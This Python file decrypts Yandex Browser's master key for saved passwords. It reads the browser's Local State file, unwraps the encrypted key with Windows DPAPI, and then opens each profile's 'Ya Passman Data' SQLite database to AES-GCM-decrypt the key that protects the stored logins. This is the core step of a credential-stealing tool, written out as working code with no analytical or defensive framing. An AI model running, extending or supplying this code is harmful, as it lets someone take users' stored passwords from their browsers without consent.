import os
import json
import sqlite3
import win32crypt
import base64
from Crypto.Cipher import AES


YANDEX_SECRETE: bytes = b'\x08\x01\x12\x20' # this is yendex secrete


def decrypt_aes_gcm(cipher_data: bytes, iv: bytes, key: bytes, attrybute_bolb=None) -> bytes:
    tag: bytes = cipher_data[-16:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    if attrybute_bolb:
        cipher.update(attrybute_bolb)
        
    decrypt_data: bytes = cipher.decrypt_and_verify(cipher_data[:-16], tag)
    return decrypt_data

def unprotect_data_dpapi(data: bytes) -> bytes:
    return win32crypt.CryptUnprotectData(
            data,
            None,
            None,
            None,
            0
        )[1]

def get_yandex_master_key(local_state_path: str) -> None:

    # C:\Users\yoi\AppData\Local\Yandex\YandexBrowser\User Data
    with open(local_state_path, "r", encoding="utf-8", errors='ignore') as local_state_data:
        c = local_state_data.read()

    
    try:
        json_loade: dict[str, str] = json.loads(c)

        key_decode: str = base64.b64decode(json_loade["os_crypt"]["encrypted_key"])

        if not key_decode:
            return

        unprotect_key: bytes = unprotect_data_dpapi(key_decode[5:])
        # print(unprotect_key)
    except Exception as err:
        print(err)
        return

    profiles: list[str] = [
        'Default',
        'Profile 1',
        'Profile 2',
        'Profile 3',
        'Profile 4',
        'Profile 5',
        'Person 1',
        'Person 2',
        'Person 3',
    ]

    for profile in profiles:
        ya_passman_data: str = os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data" , profile, "Ya Passman Data")
        if not os.path.exists(ya_passman_data):
            continue


        try:
            conn = sqlite3.connect(ya_passman_data)
            cursor = conn.cursor()
            rows = cursor.execute(
                "SELECT value FROM meta WHERE key='local_encryptor_data'"
            )
            res: list[tuple[bytes]] = rows.fetchall()

            encrypted_data: bytes = res[0][0]# decrypt this with unprotect_key

            if not encrypted_data:
                print('you dont hava key')
                return None

            dind: int = encrypted_data.rfind(b"v10")
            if dind != -1:
                encrypted_data = encrypted_data[dind+3:dind+99] # remove v10 from bolb data
                iv = encrypted_data[:12]
                nana = decrypt_aes_gcm(encrypted_data[12:], iv, unprotect_key)
                if nana.startswith(YANDEX_SECRETE):
                    # print(nana[len(YANDEX_SECRETE):len(YANDEX_SECRETE)+32])
                    return nana[len(YANDEX_SECRETE):len(YANDEX_SECRETE)+32]
        except Exception as err:
            print(err)
            return None